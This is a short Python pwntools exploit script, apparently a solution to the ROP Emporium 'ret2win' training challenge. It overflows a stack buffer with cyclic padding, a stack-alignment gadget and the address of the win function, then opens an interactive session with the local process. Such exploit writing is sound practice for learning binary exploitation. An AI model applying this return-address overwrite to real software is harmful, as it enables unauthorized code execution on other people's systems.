#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./ret2win")

payload = b'aaaaaaaaaaaaaaaaaaaabaaacaaadaaaeaaafaaa' + pack(0x000000000040053e) + pack(0x400756)

io = process()
#gdb.attach(io, gdbscript='''
#    b *main
#    commands
#    info registers
#    x/20x $rsp
#    continue
#    end
#''')

io.recvuntil("> ")

io.sendline(payload)
io.interactive()
